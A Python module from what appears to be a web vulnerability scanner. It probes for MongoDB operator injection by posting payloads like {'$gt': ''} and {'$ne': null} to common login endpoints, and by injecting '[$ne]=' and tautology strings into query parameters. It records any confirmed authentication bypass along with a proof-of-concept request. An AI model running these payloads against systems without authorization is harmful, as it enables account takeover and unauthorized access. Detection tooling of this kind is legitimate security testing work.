"""NoSQL (MongoDB-operator) injection probe (vuln phase, non-destructive).

Node/Mongo apps (Juice Shop, countless Express+Mongoose stacks) build queries
straight from request bodies, so a `{"$gt": ""}` or `{"$ne": null}` in place of
a credential turns the WHERE into "match anything" — an auth bypass that never
touches a single `'`. This probe has two modes:

  (1) login / auth bypass — POST operator-injection JSON to common login
      endpoints and confirm a bypass ONLY when a bogus-credential baseline does
      NOT yield a token but the operator payload yields a 200 carrying a
      token / JWT (mirrors login_sqli's baseline discipline to keep FPs low).

  (2) query params — for a URL carrying parameters, replace a value with a
      `[$ne]=` / boolean-tautology payload and flag a response that diverges
      from a benign baseline in a way the tautology should produce.

Detection only — any recovered session is never used. GET/benign POST payloads
only; nothing mutates server state. Runs in the vuln phase (fires without --go).
"""

from __future__ import annotations

import json
import logging
import re
import urllib.parse
from typing import List, Optional
from urllib.parse import urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, add_query, fetch, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.nosql_injection")

TECHNIQUE = "nosql_injection"

# Root-relative login endpoints, REST and classic.
_LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/login",
    "/login", "/auth/login", "/user/login", "/account/login", "/signin",
]

# Operator-injection login bodies. Each value is a dict whose JSON-encoded form
# carries a Mongo operator; a vulnerable query treats it as "match anything".
_OP_BODIES = [
    {"$gt": ""},
    {"$ne": None},
    {"$ne": ""},
    {"$gt": None},
]

# Query-string payloads: bracketed operator + a boolean tautology.
_QUERY_PAYLOADS = ["[$ne]=", "'||'1'=='1", '"||"1"=="1', "[$gt]="]

# A JWT (header.payload.signature) or a JSON token field signals a live session.
_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}")
_TOKEN_KEYS = re.compile(r'"(token|authentication|access_token|auth_token|jwt)"', re.I)


def _origin(url: str) -> str:
    p = urlsplit(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else url.rstrip("/")


def _has_token(resp: Optional[HttpResp]) -> bool:
    if not resp or resp.status != 200 or not resp.body:
        return False
    return bool(_JWT_RE.search(resp.body) or _TOKEN_KEYS.search(resp.body))


async def _post_json(url: str, body_obj: dict, *, timeout: float) -> Optional[HttpResp]:
    body = json.dumps(body_obj).encode()
    return await fetch("POST", url, headers={"Content-Type": "application/json"},
                       body=body, timeout=timeout, follow_redirects=False)


async def _probe_login(origin: str, timeout: float) -> List[dict]:
    """Mode (1): operator-injection auth bypass against common login paths."""
    findings: list[dict] = []
    for path in _LOGIN_PATHS:
        login_url = origin + path
        # Baseline: a wrong credential must NOT return a token, else the endpoint
        # hands tokens to anyone and a token is no injection signal.
        baseline = await _post_json(
            login_url,
            {"email": "no_such_user_7c12@example.com", "password": "wrongpass_7c12"},
            timeout=timeout)
        if baseline is None or baseline.status >= 500:
            continue
        if _has_token(baseline):
            continue
        for op in _OP_BODIES:
            payload_obj = {"email": op, "password": op}
            resp = await _post_json(login_url, payload_obj, timeout=timeout)
            if _has_token(resp):
                payload_str = json.dumps(payload_obj)
                findings.append({
                    "type": "auth_bypass_confirmed",
                    "vuln_type": "nosql_injection:login",
                    "title": f"NoSQL operator-injection auth bypass at {path}",
                    "severity": "critical",
                    "url": login_url,
                    "parameter": "email",
                    "payload": payload_str,
                    "cwe": "CWE-943",
                    "confidence": 0.92,
                    "foothold": True,
                    "evidence": (
                        f"JSON login with operator body {payload_str} returned a "
                        "200 carrying a session token while a bogus credential "
                        "did not — the credential comparison is operator-injectable"
                    ),
                    "poc_request": f"POST {login_url} (json) {payload_str}",
                })
                return findings  # one confirmed bypass is enough
    return findings


def _params(url: str) -> List[str]:
    return list(urllib.parse.parse_qsl(urlsplit(url).query))


def _resp_signature(resp: Optional[HttpResp]) -> Optional[tuple]:
    if resp is None:
        return None
    return (resp.status, len(resp.body or ""))


async def _probe_query(url: str, timeout: float) -> List[dict]:
    """Mode (2): operator/tautology in query params, detect divergence."""
    params = _params(url)
    if not params:
        return []
    findings: list[dict] = []
    # Benign baseline: the URL with an obviously-false sentinel value, so the
    # tautology payload must diverge FROM a non-matching state to be a signal.
    for key, _orig in params:
        false_url = add_query(url, key, "viper_nomatch_7c12")
        baseline = await fetch("GET", false_url, timeout=timeout)
        base_sig = _resp_signature(baseline)
        if base_sig is None or base_sig[0] >= 500:
            continue
        for payload in _QUERY_PAYLOADS:
            # `[$ne]=` injects an operator on the key itself (key[$ne]=x); the
            # tautology payloads inject into the value.
            if payload.startswith("["):
                p = urlsplit(url)
                raw_q = urllib.parse.parse_qsl(p.query)
                raw_q = [(k, v) for (k, v) in raw_q if k != key]
                raw_q.append((f"{key}{payload.rstrip('=')}", "viper_nomatch_7c12"))
                new_q = urllib.parse.urlencode(raw_q, safe="[]$")
                inj_url = urllib.parse.urlunsplit(
                    (p.scheme, p.netloc, p.path, new_q, p.fragment))
            else:
                inj_url = add_query(url, key, payload)
            resp = await fetch("GET", inj_url, timeout=timeout)
            sig = _resp_signature(resp)
            if sig is None or sig[0] >= 500:
                continue
            # A successful operator/tautology injection makes the false-baseline
            # query start matching: a 2xx where the baseline was 4xx, or a clear
            # body-size jump on the same status.
            diverged = (
                (sig[0] < 400 <= base_sig[0]) or
                (sig[0] == base_sig[0] and sig[1] > base_sig[1] * 2 and sig[1] > 256)
            )
            if diverged:
                findings.append({
                    "type": "nosql_injection_param",
                    "vuln_type": "nosql_injection:query",
                    "title": f"NoSQL injection in query parameter '{key}'",
                    "severity": "high",
                    "url": inj_url,
                    "parameter": key,
                    "payload": payload,
                    "cwe": "CWE-943",
                    "confidence": 0.7,
                    "evidence": (
                        f"operator/tautology payload {payload!r} on '{key}' "
                        f"changed the response (baseline {base_sig[0]}/"
                        f"{base_sig[1]}B → {sig[0]}/{sig[1]}B), matching where a "
                        "non-existent value did not"
                    ),
                    "poc_request": f"GET {inj_url}",
                })
                return findings
    return findings


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    origin = _origin(url)
    timeout = min(agent.timeout_s, 8.0)

    findings = await _probe_login(origin, timeout)
    if findings:
        return findings
    return await _probe_query(url, timeout)


register_worker("vuln", TECHNIQUE, run)